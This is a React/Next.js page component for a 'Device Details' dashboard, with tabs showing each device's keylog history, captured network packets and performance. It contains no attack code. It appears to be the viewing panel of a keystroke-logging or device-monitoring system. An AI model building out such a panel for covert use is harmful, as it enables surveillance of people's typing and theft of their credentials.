import { Suspense } from "react";
import Link from "next/link";
import { ChevronLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { DeviceInfo } from "@/components/devices/device-info";
import { DeviceKeylogs } from "@/components/devices/device-keylogs";
import { DevicePackets } from "@/components/devices/device-packets";
import { DevicePerformance } from "@/components/devices/device-performance";

export default function DeviceDetailPage({
  params,
}: {
  params: { id: string };
}) {
  const deviceId = params.id;

  return (
    <div className="flex flex-col gap-4">
      <div className="flex items-center gap-2">
        <Button variant="outline" size="icon" asChild>
          <Link href="/dashboard/devices">
            <ChevronLeft className="h-4 w-4" />
            <span className="sr-only">Back to devices</span>
          </Link>
        </Button>
        <h2 className="text-3xl font-bold tracking-tight">Device Details</h2>
      </div>

      <Suspense fallback={<div>Loading device information...</div>}>
        <DeviceInfo deviceId={deviceId} />
      </Suspense>

      <Tabs defaultValue="overview" className="space-y-4">
        <TabsList>
          <TabsTrigger value="overview">Overview</TabsTrigger>
          <TabsTrigger value="keylogs">Keylogs</TabsTrigger>
          <TabsTrigger value="packets">Network Packets</TabsTrigger>
          <TabsTrigger value="performance">Performance</TabsTrigger>
        </TabsList>

        <TabsContent value="overview" className="space-y-4">
          <div className="grid gap-4 md:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle>Recent Keylogs</CardTitle>
                <CardDescription>
                  Latest keylog activity from this device
                </CardDescription>
              </CardHeader>
              <CardContent>
                <Suspense fallback={<div>Loading keylogs...</div>}>
                  <DeviceKeylogs deviceId={deviceId} limit={5} />
                </Suspense>
              </CardContent>
            </Card>
            <Card>
              <CardHeader>
                <CardTitle>Recent Network Activity</CardTitle>
                <CardDescription>
                  Latest network packets from this device
                </CardDescription>
              </CardHeader>
              <CardContent>
                <Suspense fallback={<div>Loading network activity...</div>}>
                  <DevicePackets deviceId={deviceId} limit={5} />
                </Suspense>
              </CardContent>
            </Card>
          </div>
          {/* <Card> */}
          {/*   <CardHeader> */}
          {/*     <CardTitle>Performance Overview</CardTitle> */}
          {/*     <CardDescription>Resource usage over time</CardDescription> */}
          {/*   </CardHeader> */}
          {/*   <CardContent> */}
          {/*     <Suspense fallback={<div>Loading performance data...</div>}> */}
          {/*       <DevicePerformance deviceId={deviceId} /> */}
          {/*     </Suspense> */}
          {/*   </CardContent> */}
          {/* </Card> */}
        </TabsContent>

        <TabsContent value="keylogs" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Keylog History</CardTitle>
              <CardDescription>
                Complete keylog history for this device
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Suspense fallback={<div>Loading keylogs...</div>}>
                <DeviceKeylogs deviceId={deviceId} />
              </Suspense>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="packets" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Network Packets</CardTitle>
              <CardDescription>
                Detailed network packet analysis
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Suspense fallback={<div>Loading network packets...</div>}>
                <DevicePackets deviceId={deviceId} />
              </Suspense>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="performance" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Performance Metrics</CardTitle>
              <CardDescription>Detailed performance analysis</CardDescription>
            </CardHeader>
            <CardContent>
              <Suspense fallback={<div>Loading performance data...</div>}>
                <DevicePerformance deviceId={deviceId} detailed />
              </Suspense>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
